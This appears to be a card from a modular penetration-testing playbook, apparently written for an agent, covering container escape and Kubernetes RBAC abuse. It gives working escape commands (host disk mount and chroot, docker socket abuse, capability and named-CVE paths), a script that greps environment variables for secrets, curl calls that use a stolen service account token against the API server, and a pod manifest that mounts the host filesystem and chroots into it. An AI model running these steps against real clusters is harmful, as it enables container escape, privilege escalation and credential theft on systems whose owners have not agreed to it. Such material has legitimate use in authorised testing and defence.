# Cloud, Container, Kubernetes, And SaaS Operations: Attack Primitives: Container Security

> Apply [../module-continuity.md](../module-continuity.md). Inherit the engagement, parent path, current capability, evidence, authorization profile, and module stack. Do not initialize a separate workflow. Checkpoint material results and return them to the parent path before leaving this card.

## Attack Primitives: Container Security

### Container Escape — Six Practical Paths

| Escape Path | Prerequisites | Technique |
|---|---|---|
| **Privileged container** | `--privileged` flag | Mount host disk: `fdisk -l; mount /dev/sda1 /mnt; chroot /mnt` |
| **Mount host docker socket** | `-v /var/run/docker.sock:/var/run/docker.sock` | `docker run -it -v /:/host --privileged alpine chroot /host` |
| **Host PID namespace** | `--pid=host` | See and interact with host processes; inject into host process |
| **Host network namespace** | `--net=host` | Access host network interfaces, sniff traffic, access host-bound services |
| **Excessive capabilities** | `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE` | Various: mount cgroups (`CAP_SYS_ADMIN` via cgroup release_agent), load kernel module, ptrace host process |
| **CVE/version-specific** | Unpatched runc/Docker/K8s | runc CVE-2019-5736, Dirty COW, Dirty Pipe, CVE-2022-0492 (cgroup v1), CVE-2022-0847 (Dirty Pipe) |

**Practical escape check script** (run inside container):
```bash
# Check if privileged
cat /proc/self/status | grep CapEff
# If CapEff is 0000003fffffffff (all caps) → likely privileged

# Check capabilities
capsh --print 2>/dev/null || cat /proc/self/status | grep Cap

# Check docker socket
ls -la /var/run/docker.sock 2>/dev/null

# Check mounts
mount | grep -E "docker|overlay|cgroup"
findmnt

# Check PID namespace
ls -la /proc/1/root 2>/dev/null  # if accessible → likely host PID namespace

# Check accessible disks
fdisk -l 2>/dev/null || ls -la /dev/sd* /dev/xvd* /dev/vd* 2>/dev/null

# Environment variables (often contain secrets, service URLs)
env | grep -iE "pass|secret|key|token|db|mongo|redis|mysql|postgres|api|auth"
```

### Kubernetes RBAC Abuse

Kubernetes service accounts may have excessive permissions. Inside a pod:

```bash
# Where am I?
cat /var/run/secrets/kubernetes.io/serviceaccount/token           # JWT for the pod's SA
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace       # Current namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt          # CA cert

# Use the token (if kubectl not installed, use curl with token)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

# What can I do?
curl -s -k -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/default/pods"
curl -s -k -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/rbac.authorization.k8s.io/v1/rolebindings"
curl -s -k -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings"

# Can I create pods? (If yes → easy escape by mounting host filesystem)
# Can I list secrets? (If yes → read all secrets in namespace)
# Can I exec into pods? (If yes → code execution on any pod)
# Can I list nodes? (If yes → host-level information)
```

**Privilege escalation via pod creation**: If your SA can create pods, create a pod that mounts the host filesystem, then `chroot`:
```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "chroot /host /bin/bash"]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
```

---


## Card Exit

Classify the result, update evidence and attempted methods, record capability or risk changes, identify affected paths, and apply the return contract in [../module-continuity.md](../module-continuity.md).
